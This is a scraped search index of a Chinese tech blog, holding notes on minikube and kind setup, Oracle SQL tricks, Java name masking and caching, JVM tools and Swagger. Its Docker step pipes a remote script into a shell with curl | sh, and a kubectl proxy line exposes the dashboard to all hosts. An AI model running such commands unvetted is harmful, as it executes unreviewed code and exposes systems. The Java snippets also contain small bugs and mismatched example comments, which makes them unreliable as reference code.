記錄","uri":"/blog/posts/%E5%AE%89%E8%A3%9D-Kubernetes-%E8%A8%98%E9%8C%84/"},{"categories":["Kubernetes"],"content":"刪除 minikube Delete minikube minikube delete \u0026\u0026 rm -rf ~/.minikube ","date":"2021-01-14","objectID":"/blog/posts/%E5%AE%89%E8%A3%9D-Kubernetes-%E8%A8%98%E9%8C%84/:1:7","tags":["kubernetes"],"title":"安裝 Minikube 記錄","uri":"/blog/posts/%E5%AE%89%E8%A3%9D-Kubernetes-%E8%A8%98%E9%8C%84/"},{"categories":["Kubernetes"],"content":"遠端連 dashboard 安裝 UI 以下參考: kubernetes/dashboard: General-purpose web UI for Kubernetes clusters [Day 14] Kubernetes Dashboard 介紹 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v2.1.0/aio/deploy/recommended.yaml namespace/kubernetes-dashboard configured serviceaccount/kubernetes-dashboard configured service/kubernetes-dashboard configured secret/kubernetes-dashboard-certs configured secret/kubernetes-dashboard-csrf configured secret/kubernetes-dashboard-key-holder configured configmap/kubernetes-dashboard-settings configured role.rbac.authorization.k8s.io/kubernetes-dashboard configured clusterrole.rbac.authorization.k8s.io/kubernetes-dashboard configured rolebinding.rbac.authorization.k8s.io/kubernetes-dashboard configured deployment.apps/kubernetes-dashboard configured service/dashboard-metrics-scraper configured deployment.apps/dashboard-metrics-scraper configured # 會遇到這個錯誤 The ClusterRoleBinding \"kubernetes-dashboard\" is invalid: roleRef: Invalid value: rbac.RoleRef{APIGroup:\"rbac.authorization.k8s.io\", Kind:\"ClusterRole\", Name:\"kubernetes-dashboard\"}: cannot change roleRef 這個錯誤，我目前無解… 因為刪除 kubernetes-dashboard 後會馬上跳出來 $ kubectl proxy # 預設 localhost # Starting to serve on 127.0.0.1:8001 kubectl proxy --address='0.0.0.0' --port=8002 --accept-hosts='^*$' # 開啟遠端連線 其他資源:kubernetes-dashboard(1.8.3)部署与踩坑 - 雨夜朦胧 - 博客园 ","date":"2021-01-14","objectID":"/blog/posts/%E5%AE%89%E8%A3%9D-Kubernetes-%E8%A8%98%E9%8C%84/:1:8","tags":["kubernetes"],"title":"安裝 Minikube 記錄","uri":"/blog/posts/%E5%AE%89%E8%A3%9D-Kubernetes-%E8%A8%98%E9%8C%84/"},{"categories":["Kubernetes"],"content":"簡單 Hello World Hello Minikube | Kubernetes ","date":"2021-01-14","objectID":"/blog/posts/%E5%AE%89%E8%A3%9D-Kubernetes-%E8%A8%98%E9%8C%84/:1:9","tags":["kubernetes"],"title":"安裝 Minikube 記錄","uri":"/blog/posts/%E5%AE%89%E8%A3%9D-Kubernetes-%E8%A8%98%E9%8C%84/"},{"categories":["Kubernetes"],"content":"Kind ","date":"2021-01-14","objectID":"/blog/posts/%E5%AE%89%E8%A3%9D-Kubernetes-%E8%A8%98%E9%8C%84/:2:0","tags":["kubernetes"],"title":"安裝 Minikube 記錄","uri":"/blog/posts/%E5%AE%89%E8%A3%9D-Kubernetes-%E8%A8%98%E9%8C%84/"},{"categories":["Kubernetes"],"content":"安裝 Docker curl -sSL https://get.daocloud.io/docker | sh 詳細建議官網看新教學 設定 docker 權限 sudo usermod -G docker -a testuser 做完重新登錄 ","date":"2021-01-14","objectID":"/blog/posts/%E5%AE%89%E8%A3%9D-Kubernetes-%E8%A8%98%E9%8C%84/:2:1","tags":["kubernetes"],"title":"安裝 Minikube 記錄","uri":"/blog/posts/%E5%AE%89%E8%A3%9D-Kubernetes-%E8%A8%98%E9%8C%84/"},{"categories":["Kubernetes"],"content":"安裝 Kind curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.9.0/kind-linux-amd64 chmod +x ./kind mv ./kind /usr/local/bin/kind ","date":"2021-01-14","objectID":"/blog/posts/%E5%AE%89%E8%A3%9D-Kubernetes-%E8%A8%98%E9%8C%84/:2:2","tags":["kubernetes"],"title":"安裝 Minikube 記錄","uri":"/blog/posts/%E5%AE%89%E8%A3%9D-Kubernetes-%E8%A8%98%E9%8C%84/"},{"categories":["Kubernetes"],"content":"啟用集群 kind create cluster ","date":"2021-01-14","objectID":"/blog/posts/%E5%AE%89%E8%A3%9D-Kubernetes-%E8%A8%98%E9%8C%84/:2:3","tags":["kubernetes"],"title":"安裝 Minikube 記錄","uri":"/blog/posts/%E5%AE%89%E8%A3%9D-Kubernetes-%E8%A8%98%E9%8C%84/"},{"categories":["Kubernetes"],"content":"刪除集群 kind delete cluster 這邊要注意一點 移除集群預設選擇設定會拿掉 所以要重新選擇 k8s config context # 查看現有選擇 k8s 環境 kubectl config current-context # 列出所有環境 kubectl config get-contexts # 選擇 k8s 環境 kubectl config use-context minikube 更多詳細設定請參考Day 8 - 與 k8s 溝通: kubectl - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 外來可能會針對設定檔做設定 這樣兩個環境就建置出來 相關教學: kind – Quick Start 使用 kind 快速搭建 kubernetes 环境 - WeihanLi - 博客园 使用 Kind 在 5 分钟内快速部署一个 Kubernetes 高可用集群 - 奇妙的 Linux 世界 快速搭建kubernetes与kubeSphere环境（亲测有效） 【容器架构】Minikube vs.kind vs.k3s-我应该用哪一个？ | 架构师智库 不同Kubernetes构建工具的介绍 - 知乎 使用 WSL 2 與 Docker Desktop 架設 Kubernetes 多節點叢集環境 (KinD) | The Will Will Web ","date":"2021-01-14","objectID":"/blog/posts/%E5%AE%89%E8%A3%9D-Kubernetes-%E8%A8%98%E9%8C%84/:2:4","tags":["kubernetes"],"title":"安裝 Minikube 記錄","uri":"/blog/posts/%E5%AE%89%E8%A3%9D-Kubernetes-%E8%A8%98%E9%8C%84/"},{"categories":["Kubernetes"],"content":"查看 minikube plugin sudo minikube addons list 可以快速安裝 k8s 原件。 sudo minikube addons enable dashboard 上圖可以看到他建立新的容器。對外測試連結容器可以用 kubectl port-forward --address _IPADDRESS_-n kubernetes-dashboard service/kubernetes-dashboard 8888:80 ","date":"2021-01-14","objectID":"/blog/posts/%E5%AE%89%E8%A3%9D-Kubernetes-%E8%A8%98%E9%8C%84/:2:5","tags":["kubernetes"],"title":"安裝 Minikube 記錄","uri":"/blog/posts/%E5%AE%89%E8%A3%9D-Kubernetes-%E8%A8%98%E9%8C%84/"},{"categories":["Oracle"],"content":"最近維運有時有超過 500 筆資料 需要在 SQL 指令區查詢 但是把多千筆資料拆開也是很耗時 以固定行數切割文字檔案方法 | 程式狂想筆記 先前有研究這個方法，可以快速切分 但直接查詢全部還是最快 ","date":"2021-01-12","objectID":"/blog/posts/Oracle-WHERE-IN-%E6%A2%9D%E4%BB%B6%E5%A1%9E%E5%85%A5%E8%B6%85%E9%81%8E-500-%E7%AD%86%E6%9F%A5%E8%A9%A2%E6%A2%9D%E4%BB%B6%E6%96%B9%E6%B3%95/:0:0","tags":["oracle"],"title":"Oracle WHERE IN 條件塞入超過 500 筆查詢條件方法","uri":"/blog/posts/Oracle-WHERE-IN-%E6%A2%9D%E4%BB%B6%E5%A1%9E%E5%85%A5%E8%B6%85%E9%81%8E-500-%E7%AD%86%E6%9F%A5%E8%A9%A2%E6%A2%9D%E4%BB%B6%E6%96%B9%E6%B3%95/"},{"categories":["Oracle"],"content":"暫存表 昭佑.天翔: Oracle DB 中, 建立 Temporary Table Oracle Temp Table 應用 @ Chuck Oracle Engineer :: 痞客邦 :: 正式環境無法使用 ","date":"2021-01-12","objectID":"/blog/posts/Oracle-WHERE-IN-%E6%A2%9D%E4%BB%B6%E5%A1%9E%E5%85%A5%E8%B6%85%E9%81%8E-500-%E7%AD%86%E6%9F%A5%E8%A9%A2%E6%A2%9D%E4%BB%B6%E6%96%B9%E6%B3%95/:1:0","tags":["oracle"],"title":"Oracle WHERE IN 條件塞入超過 500 筆查詢條件方法","uri":"/blog/posts/Oracle-WHERE-IN-%E6%A2%9D%E4%BB%B6%E5%A1%9E%E5%85%A5%E8%B6%85%E9%81%8E-500-%E7%AD%86%E6%9F%A5%E8%A9%A2%E6%A2%9D%E4%BB%B6%E6%96%B9%E6%B3%95/"},{"categories":["Oracle"],"content":"神奇大法 with t as ( select (column_value).getnumberval() Codes from xmltable('1,2,3,4,5') ) SELECT * FROM t WHERE NOT EXISTS (SELECT 1 FROM M_ITEMS M WHERE codes = M.ITEM_CODE); 和 with t as ( select (column_value).getstringval() Codes from xmltable('\"A\",\"B\",\"C\"') ) SELECT * FROM t WHERE NOT EXISTS (SELECT 1 FROM M_ITEMS M WHERE codes = M.ITEM_CODE); 主要重點是 select (column_value).getnumberval() Codes from xmltable('1,2,3,4,5') 參考: sql - Oracle- create a temporary resultset for use in a query - Stack Overflow 2021-03-13 ","date":"2021-01-12","objectID":"/blog/posts/Oracle-WHERE-IN-%E6%A2%9D%E4%BB%B6%E5%A1%9E%E5%85%A5%E8%B6%85%E9%81%8E-500-%E7%AD%86%E6%9F%A5%E8%A9%A2%E6%A2%9D%E4%BB%B6%E6%96%B9%E6%B3%95/:2:0","tags":["oracle"],"title":"Oracle WHERE IN 條件塞入超過 500 筆查詢條件方法","uri":"/blog/posts/Oracle-WHERE-IN-%E6%A2%9D%E4%BB%B6%E5%A1%9E%E5%85%A5%E8%B6%85%E9%81%8E-500-%E7%AD%86%E6%9F%A5%E8%A9%A2%E6%A2%9D%E4%BB%B6%E6%96%B9%E6%B3%95/"},{"categories":["Oracle"],"content":"Oracle IN 可放超過1000查詢條件方法 雖然要手動組 select * from table where (1,ID) in ( (1,0001),(1,0002)... (1,1999) ) 參考:oracle 1000 in clause limit @ 阿朗的部落格 :: 痞客邦 :: ","date":"2021-01-12","objectID":"/blog/posts/Oracle-WHERE-IN-%E6%A2%9D%E4%BB%B6%E5%A1%9E%E5%85%A5%E8%B6%85%E9%81%8E-500-%E7%AD%86%E6%9F%A5%E8%A9%A2%E6%A2%9D%E4%BB%B6%E6%96%B9%E6%B3%95/:3:0","tags":["oracle"],"title":"Oracle WHERE IN 條件塞入超過 500 筆查詢條件方法","uri":"/blog/posts/Oracle-WHERE-IN-%E6%A2%9D%E4%BB%B6%E5%A1%9E%E5%85%A5%E8%B6%85%E9%81%8E-500-%E7%AD%86%E6%9F%A5%E8%A9%A2%E6%A2%9D%E4%BB%B6%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"用了這麼久都不知道 記錄一下 請到裡面文章查看流程 Harry 程式筆記: [WinSCP] sftp下使用sudo上傳檔案 備份圖 想進去root 再切換 SVP … 結果不能切換成功 或使用 Linux創建用戶後，切換用戶報This account is currently not available_wangmm0218的博客-CSDN博客 ","date":"2021-01-10","objectID":"/blog/posts/WinSCP-%E7%94%A8-sudo-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88%E7%9A%84%E6%96%B9%E6%B3%95/:0:0","tags":["winscp"],"title":"WinSCP 用 sudo 上傳檔案的方法","uri":"/blog/posts/WinSCP-%E7%94%A8-sudo-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88%E7%9A%84%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"切換 group Set effective/primary group of login? :: Support Forum :: WinSCP 使用 newgrp \u003cgroup\u003e(尚未測試) ","date":"2021-01-10","objectID":"/blog/posts/WinSCP-%E7%94%A8-sudo-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88%E7%9A%84%E6%96%B9%E6%B3%95/:1:0","tags":["winscp"],"title":"WinSCP 用 sudo 上傳檔案的方法","uri":"/blog/posts/WinSCP-%E7%94%A8-sudo-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88%E7%9A%84%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"網路收集幾個方法 ","date":"2021-01-07","objectID":"/blog/posts/%E4%B8%AD%E6%96%87%E5%A7%93%E5%90%8D%E9%81%AE%E7%BD%A9%E5%92%8C%E5%88%A4%E6%96%B7%E5%AD%97%E4%B8%B2%E6%9C%89%E4%B8%AD%E8%8B%B1%E6%96%87%E6%96%B9%E6%B3%95/:0:0","tags":["java"],"title":"中文姓名遮罩和判斷字串有中英文方法","uri":"/blog/posts/%E4%B8%AD%E6%96%87%E5%A7%93%E5%90%8D%E9%81%AE%E7%BD%A9%E5%92%8C%E5%88%A4%E6%96%B7%E5%AD%97%E4%B8%B2%E6%9C%89%E4%B8%AD%E8%8B%B1%E6%96%87%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"判斷中英文方法 判断字符串是否纯中文、英文、数字、等等_心丨悦 的专栏-CSDN博客 public void isEnglish(String str) { //【全为英文】返回true 否则false boolean result1 = str.matches(\"[a-zA-Z]+\"); //【全为数字】返回true boolean result6 = str.matches(\"[0-9]+\"); //【除英文和数字外无其他字符(只有英文数字的字符串)】返回true 否则false boolean result2 = str.matches(\"[a-zA-Z0-9]+\"); //【含有英文】true String regex1 = \".*[a-zA-z].*\"; boolean result3 = str.matches(regex1); //【含有数字】true String regex2 = \".*[0-9].*\"; boolean result4 = str.matches(regex2); //判断是否为纯中文，不是返回false String regex3 = \"[\\\\u4e00-\\\\u9fa5]+\"; boolean result5 = str.matches(regex3); System.out.println(result1 + \"--\" + result2 + \"--\" + result3 + \"--\" + result4 + \"--\" + result5 + \"--\" + result6); } ","date":"2021-01-07","objectID":"/blog/posts/%E4%B8%AD%E6%96%87%E5%A7%93%E5%90%8D%E9%81%AE%E7%BD%A9%E5%92%8C%E5%88%A4%E6%96%B7%E5%AD%97%E4%B8%B2%E6%9C%89%E4%B8%AD%E8%8B%B1%E6%96%87%E6%96%B9%E6%B3%95/:1:0","tags":["java"],"title":"中文姓名遮罩和判斷字串有中英文方法","uri":"/blog/posts/%E4%B8%AD%E6%96%87%E5%A7%93%E5%90%8D%E9%81%AE%E7%BD%A9%E5%92%8C%E5%88%A4%E6%96%B7%E5%AD%97%E4%B8%B2%E6%9C%89%E4%B8%AD%E8%8B%B1%E6%96%87%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"中英文姓名判斷 public class HelloWorld{ public static void main(String[] args) { String id = \"A123456789\"; System.out.println(maskName(\"黃藥師\")); // A1*****789 System.out.println(maskName(\"Hello World\")); // A1234***** System.out.println(maskName(\"Huang d\")); // ####456789 } public static String maskName(String name){ String result = \"\"; if (isEnglish(name)) { result = mask(name, 2, name.length()-3, '*'); }else{ result = mask(name, 1, name.length()-2, '*'); } return result; } //判断是不是英文字母 public static boolean isEnglish(String charaString) { if( charaString == null \u0026\u0026 \"\".equals(charaString)){ return false; } return charaString.substring(0,1).matches(\"^[a-zA-Z]*\"); } /** * 字串遮罩 * @param text 原始字串 * @param start 遮罩起始位置index * @param length 遮罩長度 * @param maskSymbol 遮罩符號 * @return 遮罩過的字串 */ private static String mask(String text, int start, int length, char maskSymbol) { if (text == null || text.isEmpty()) { return \"\"; } if (start \u003c 0) { start = 0; } if (length \u003c 1) { return text; } StringBuilder sb = new StringBuilder(); char[] cc = text.toCharArray(); for (int i = 0; i \u003c cc.length; i++) { if (i \u003e= start \u0026\u0026 i \u003c (start + length)) { sb.append(maskSymbol); } else { sb.append(cc[i]); } } return sb.toString(); } } 遮罩長度可以改 public static String maskName(String name){ String result = \"\"; if (isEnglish(name)) { result = mask(name, 2, name.length()-3 \u003e 8 ? 8 : name.length()-3 , '*'); }else{ result = mask(name, 1, name.length()-2 \u003e 8 ? 8 : name.length()-2 , 'o'); } return result; } ","date":"2021-01-07","objectID":"/blog/posts/%E4%B8%AD%E6%96%87%E5%A7%93%E5%90%8D%E9%81%AE%E7%BD%A9%E5%92%8C%E5%88%A4%E6%96%B7%E5%AD%97%E4%B8%B2%E6%9C%89%E4%B8%AD%E8%8B%B1%E6%96%87%E6%96%B9%E6%B3%95/:2:0","tags":["java"],"title":"中文姓名遮罩和判斷字串有中英文方法","uri":"/blog/posts/%E4%B8%AD%E6%96%87%E5%A7%93%E5%90%8D%E9%81%AE%E7%BD%A9%E5%92%8C%E5%88%A4%E6%96%B7%E5%AD%97%E4%B8%B2%E6%9C%89%E4%B8%AD%E8%8B%B1%E6%96%87%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"sql 判斷方法 oracle 判断字符是否为字母，oracle字符_数据库前沿资讯 | 和通数据库 How to mask characters with X in a varchar2 field in Oracle SQL - Stack Overflow --- postgressql select substr(a.name,1,2)|| repeat('*',length(a.name)-2)|| substr(a.name,length(a.name)-1,2),a.name,ascii(substring(a.name,1,1)) between 65 and 122, CASE WHEN ascii(substring(a.name,1,1)) between 65 and 122 then substr(a.name,1,2)|| repeat('*',length(a.name)-3)|| substr(a.name,-1,1) else substr(a.name,1,1)|| repeat('*',length(a.name)-2)|| substr(a.name,-1,1) end as mask_name,length(a.name) from account a --oracle select substr(full_name,1,5) || regexp_replace(substr(full_name,6,5), '[^ ]', 'X') || substr(full_name,11,5) || regexp_replace(substr(full_name,16,5), '[^ ]', 'X') || substr(full_name,21,5) || regexp_replace(substr(full_name,26,5), '[^ ]', 'X') as masked_name from ( select 'Tristram Vladimir Chan ' as full_name from dual ) ","date":"2021-01-07","objectID":"/blog/posts/%E4%B8%AD%E6%96%87%E5%A7%93%E5%90%8D%E9%81%AE%E7%BD%A9%E5%92%8C%E5%88%A4%E6%96%B7%E5%AD%97%E4%B8%B2%E6%9C%89%E4%B8%AD%E8%8B%B1%E6%96%87%E6%96%B9%E6%B3%95/:2:1","tags":["java"],"title":"中文姓名遮罩和判斷字串有中英文方法","uri":"/blog/posts/%E4%B8%AD%E6%96%87%E5%A7%93%E5%90%8D%E9%81%AE%E7%BD%A9%E5%92%8C%E5%88%A4%E6%96%B7%E5%AD%97%E4%B8%B2%E6%9C%89%E4%B8%AD%E8%8B%B1%E6%96%87%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"最近程式會頻繁撈取資料庫 想有沒有減輕資料庫負擔 後來想到之前 swoole 課程有提到 Memory Cache 今天網路找了一下 Java 實作 發現還滿多實作可以直接使用 CachesExplained CachesExplained · google/guava Wiki · GitHub [Google Guava] 3-缓存 | 并发编程网 – ifeve.com HashMap? ConcurrentHashMap? 相信看完这篇没人能难住你！ | crossoverJie’s Blog GitHub - lixk/ECache: simple memory cache for Java 簡單實用，我是使用這個範例實作 就專案能用 import java.util.HashMap; import java.util.Map; import java.util.concurrent.Executors; import java.util.concurrent.Future; import java.util.concurrent.ScheduledExecutorService; import java.util.concurrent.TimeUnit; /** * simple memory cache * * @author lixk */ public class ECache { /** * key-value data set */ private final static Map\u003cString, Entity\u003e DATA_BASE = new HashMap\u003c\u003e(); /** * use scheduled executor to clean expired data */ private final static ScheduledExecutorService CLEANER = Executors.newSingleThreadScheduledExecutor(); /** * put data to cache * * @param key unique identification for data * @param value your data */ public synchronized static void put(String key, Object value) { ECache.put(key, value, 0L); } /** * put data to cache * * @param key unique identification for data * @param value your data * @param expire data survival time in milliseconds */ public synchronized static void put(final String key, final Object value, final long expire) { //clean old data ECache.remove(key); //set schedule task if (expire \u003e 0L) { Future future = CLEANER.schedule(new Runnable() { @Override public void run() { //remove data synchronized (ECache.class) { DATA_BASE.remove(key); } } }, expire, TimeUnit.MILLISECONDS); DATA_BASE.put(key, new Entity(value, expire, future)); } else { DATA_BASE.put(key, new Entity(value, null, null)); } } /** * read data from cache * * @param key unique identification for data * @return data bound to the key */ public synchronized static \u003cT\u003e T get(String key) { Entity entity = DATA_BASE.get(key); if (entity != null \u0026\u0026 entity.isAlive()) { return (T) entity.value; } return null; } /** * remove cached data * * @param key unique identification for data * @return data bound to the key */ public synchronized static \u003cT\u003e T remove(String key) { //remove data from data set Entity entity = DATA_BASE.remove(key); if (entity == null) { return null; } //cancel the schedule task if (entity.future != null) { entity.future.cancel(true); } return entity.isAlive() ? (T) entity.value : null; } /** * cached data entity */ private static class Entity { Object value; Long expirationTime; Future future; Entity(Object value, Long expire, Future future) { this.value = value; this.expirationTime = (expire == null ? null : System.currentTimeMillis() + expire); this.future = future; } /** * Judging whether the entity is still alive * * @return boolean */ boolean isAlive() { return this.expirationTime == null || this.expirationTime \u003e= System.currentTimeMillis(); } } } Java in Memory Cache – Geekout – From one propeller head to another! 利用LRUMap 设计缓存 - mingziday - 博客园 彩蛋: 什么是 istio | Cizixs Write Here 【技术教程】利用User-agent-utils获取用户浏览器、操作系统等信息 - 数字人文技术实验室 新一代的微服务架构 Service Mesh - SegmentFault 思否 GitHub - qiao-zhi/Spring-Struts-Mybaits-Shiro: Spring+Struts2+Mybatis+Shiro的权限管理 ","date":"2021-01-07","objectID":"/blog/posts/Java-%E5%AF%A6%E4%BD%9C-Memory-Cache-%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/:0:0","tags":["java"],"title":"Java 實作 Memory Cache 方法小記","uri":"/blog/posts/Java-%E5%AF%A6%E4%BD%9C-Memory-Cache-%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"使用清單 # 檢視當前機器上所有執行的java程序名稱與pid(程序編號) jps -l # 顯示指定的jvm程序所有的屬性設定和配置引數 jinfo pid TODO: 整理 利用jmap和MAT等工具查看JVM运行时堆内存 - osc_3wmngxzc的个人空间 - OSCHINA - 中文开源技术交流社区 JVM 記憶體溢出 - 夜升筆談 JVM故障分析及性能优化实战(VII)——使用MAT的Histogram和Dominator Tree定位溢出源 - 云+社区 - 腾讯云 JVM(完成度95%,不斷更新) - ⎝⎛CodingNote.cc ⎞⎠ JVM引數對J2EE效能優化的影響 - IT閱讀 ","date":"2021-01-04","objectID":"/blog/posts/JVM-%E6%9F%A5%E7%9C%8B%E8%A8%98%E6%86%B6%E9%AB%94%E4%BD%BF%E7%94%A8%E6%83%85%E6%B3%81%E6%96%B9%E6%B3%95/:1:0","tags":["jvm"],"title":"JVM 查看記憶體使用情況方法","uri":"/blog/posts/JVM-%E6%9F%A5%E7%9C%8B%E8%A8%98%E6%86%B6%E9%AB%94%E4%BD%BF%E7%94%A8%E6%83%85%E6%B3%81%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"搭在 spring 3 網路上很多教學都是使用 spring MVC 去做串接 由於公司上使用是舊版 所以找找有沒有能用的方法 最後成功來記錄一下 ","date":"2021-01-04","objectID":"/blog/posts/springframework3-with-struts2-%E4%BD%BF%E7%94%A8-swagger-%E5%B7%A5%E5%85%B7%E6%B3%A8%E8%A7%A3%E4%BD%BF%E7%94%A8/:0:0","tags":["spring","struts2","swagger"],"title":"springframework3 with struts2 使用 swagger 工具注解使用","uri":"/blog/posts/springframework3-with-struts2-%E4%BD%BF%E7%94%A8-swagger-%E5%B7%A5%E5%85%B7%E6%B3%A8%E8%A7%A3%E4%BD%BF%E7%94%A8/"},{"categories":["Java"],"content":"下載依賴 \u003cdependency\u003e \u003cgroupId\u003eio.swagger\u003c/groupId\u003e \u003cartifactId\u003eswagger-jersey2-jaxrs\u003c/artifactId\u003e \u003cversion\u003e1.5.0\u003c/version\u003e \u003c/dependency\u003e 由於我專案沒有用 maven 所以…自己想辦法抓 mvn dependency:get -DgroupId=io.swagger -DartifactId=swagger-jersey2-jaxrs -Dversion=1.6.2 -Ddest=/mnt/d/mvntest 參考:How to simply download a JAR using Maven? - Stack Overflow 但後來發現還是不比Maven 建置專案初體驗 | 程式狂想筆記設定好 pom.xml 在執行mvn dependency:copy-dependencies快速 ","date":"2021-01-04","objectID":"/blog/posts/springframework3-with-struts2-%E4%BD%BF%E7%94%A8-swagger-%E5%B7%A5%E5%85%B7%E6%B3%A8%E8%A7%A3%E4%BD%BF%E7%94%A8/:1:0","tags":["spring","struts2","swagger"],"title":"springframework3 with struts2 使用 swagger 工具注解使用","uri":"/blog/posts/springframework3-with-struts2-%E4%BD%BF%E7%94%A8-swagger-%E5%B7%A5%E5%85%B7%E6%B3%A8%E8%A7%A3%E4%BD%BF%E7%94%A8/"},{"categories":["Java"],"content":"配製 swagger(web.xml) 以下參照Jersey整合Swagger自动生成API文档 可依照源專案 servlet 還是filter 做調整 \u003c!-- servlet 設定--\u003e \u003c!-- jersey --\u003e \u003cservlet\u003e \u003cservlet-name\u003ejersey\u003c/servlet-name\u003e \u003cservlet-class\u003eorg.glassfish.jersey.servlet.ServletContainer\u003c/servlet-class\u003e \u003cinit-param\u003e \u003cparam-name\u003ejersey.config.server.provider.packages\u003c/param-name\u003e \u003cparam-value\u003eio.swagger.jaxrs.listing,com.devzeng.service.schedule.api\u003c/param-value\u003e \u003c/init-param\u003e \u003cload-on-startup\u003e1\u003c/load-on-startup\u003e \u003c/servlet\u003e \u003cservlet-mapping\u003e \u003cservlet-name\u003ejersey\u003c/servlet-name\u003e \u003curl-pattern\u003e/api/*\u003c/url-pattern\u003e \u003c/servlet-mapping\u003e 新增swagger配置 \u003c!-- swagger --\u003e \u003cservlet\u003e \u003cservlet-name\u003eJersey2Config\u003c/servlet-name\u003e \u003cservlet-class\u003eio.swagger.jersey.config.JerseyJaxrsConfig\u003c/servlet-class\u003e \u003cinit-param\u003e \u003cparam-name\u003eapi.version\u003c/param-name\u003e \u003cparam-value\u003e1.0.0\u003c/param-value\u003e \u003c/init-param\u003e \u003cinit-param\u003e \u003cparam-name\u003eswagger.api.basepath\u003c/param-name\u003e \u003cparam-value\u003ehttp://localhost:8080/api\u003c/param-value\u003e \u003c/init-param\u003e \u003cload-on-startup\u003e2\u003c/load-on-startup\u003e \u003c/servlet\u003e 說明： swagger.api.basepath:這個是api訪問的baseurl ","date":"2021-01-04","objectID":"/blog/posts/springframework3-with-struts2-%E4%BD%BF%E7%94%A8-swagger-%E5%B7%A5%E5%85%B7%E6%B3%A8%E8%A7%A3%E4%BD%BF%E7%94%A8/:2:0","tags":["spring","struts2","swagger"],"title":"springframework3 with struts2 使用 swagger 工具注解使用","uri":"/blog/posts/springframework3-with-struts2-%E4%BD%BF%E7%94%A8-swagger-%E5%B7%A5%E5%85%B7%E6%B3%A8%E8%A7%A3%E4%BD%BF%E7%94%A8/"},{"categories":["Java"],"content":"配置前端 swagger UI git clone https://github.com/swagger-api/swagger-ui.git git checkout 2.x # 由於版本過舊，建議使用這個版本 4、配置swagger-ui (1) 下載swagger-ui https://github.com/swagger-api/swagger-ui 推薦使用2.x版本 (2) 拷貝dist目錄下面的文件到webroot下面 (3) 修改index.html頁面的url地址 url = “http://localhost:8080/api/swagger.json”; ","date":"2021-01-04","objectID":"/blog/posts/springframework3-with-struts2-%E4%BD%BF%E7%94%A8-swagger-%E5%B7%A5%E5%85%B7%E6%B3%A8%E8%A7%A3%E4%BD%BF%E7%94%A8/:3:0","tags":["spring","struts2","swagger"],"title":"springframework3 with struts2 使用 swagger 工具注解使用","uri":"/blog/posts/springframework3-with-struts2-%E4%BD%BF%E7%94%A8-swagger-%E5%B7%A5%E5%85%B7%E6%B3%A8%E8%A7%A3%E4%BD%BF%E7%94%A8/"},{"categories":["Java"],"content":"其他文章 Documenting RESTful Java Web Services using Swagger 1: Spring Boot 使用JSONDoc快速生成Restful API - 简书 ","date":"2021-01-04","objectID":"/blog/posts/springframework3-with-struts2-%E4%BD%BF%E7%94%A8-swagger-%E5%B7%A5%E5%85%B7%E6%B3%A8%E8%A7%A3%E4%BD%BF%E7%94%A8/:4:0","tags":["spring","struts2","swagger"],"title":"springframework3 with struts2 使用 swagger 工具注解使用","uri":"/blog/posts/springframework3-with-struts2-%E4%BD%BF%E7%94%A8-swagger-%E5%B7%A5%E5%85%B7%E6%B3%A8%E8%A7%A3%E4%BD%BF%E7%94%A8/"},{"categories":["SQL"],"content":"之前有在 MySQL 用過這個需求用過這個需求GROUP_CONCAT 和 CONCAT_WS 多個橫欄和縱欄組在一起方法 | 程式狂想筆記 但是 Oracle 用上有差異 還多了一堆限制(如:字數不能超過 4000) distinct 還會被禁用??! ","date":"2020-12-24","objectID":"/blog/posts/Oracle-%E4%BD%BF%E7%94%A8-listagg-%E5%A4%9A%E5%88%97%E7%BE%A4%E7%B5%84%E5%90%88%E6%88%90%E5%90%8C%E4%B8%80%E5%88%97%E6%96%B9%E6%B3%95/:0:0","tags":["oracle","sql"],"title":"Oracle 使用 listagg 多列群組合成同一列方法","uri":"/blog/posts/Oracle-%E4%BD%BF%E7%94%A8-listagg-%E5%A4%9A%E5%88%97%E7%BE%A4%E7%B5%84%E5%90%88%E6%88%90%E5%90%8C%E4%B8%80%E5%88%97%E6%96%B9%E6%B3%95/"},{"categories":["SQL"],"content":"Distinct Oracle listagg去重distinct三種方法總結_weixiaohuai的博客-CSDN博客 Remove Duplicates From Comma Separated String — oracle-tech -- 此方法需要排序後才有過濾重複效果 select REGEXP_REPLACE('5,5,5,5,6,6,5,5,5,6,7,4,1,2,1,4,7,2', '(^|,)([^,]*)(,\\2)+','\\1\\2') from dual; --------------------------------- 5,6,5,6,7,4,1,2,1,4,7,2 ","date":"2020-12-24","objectID":"/blog/posts/Oracle-%E4%BD%BF%E7%94%A8-listagg-%E5%A4%9A%E5%88%97%E7%BE%A4%E7%B5%84%E5%90%88%E6%88%90%E5%90%8C%E4%B8%80%E5%88%97%E6%96%B9%E6%B3%95/:1:0","tags":["oracle","sql"],"title":"Oracle 使用 listagg 多列群組合成同一列方法","uri":"/blog/posts/Oracle-%E4%BD%BF%E7%94%A8-listagg-%E5%A4%9A%E5%88%97%E7%BE%A4%E7%B5%84%E5%90%88%E6%88%90%E5%90%8C%E4%B8%80%E5%88%97%E6%96%B9%E6%B3%95/"},{"categories":["SQL"],"content":"字數過長 SQL\u003e select rtrim(xmlagg(xmlelement(e,id,',').extract('//text()') order by id).GetClobVal(),',') from (select level as id from dual connect by level \u003c 1050) / RTRIM(XMLAGG(XMLELEMENT(E,ID,',').EXTRACT('//TEXT()')ORDERBYID).GETCLOBVAL(),',' -------------------------------------------------------------------------------- 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18... ora-01489 字符串連接的結果過長 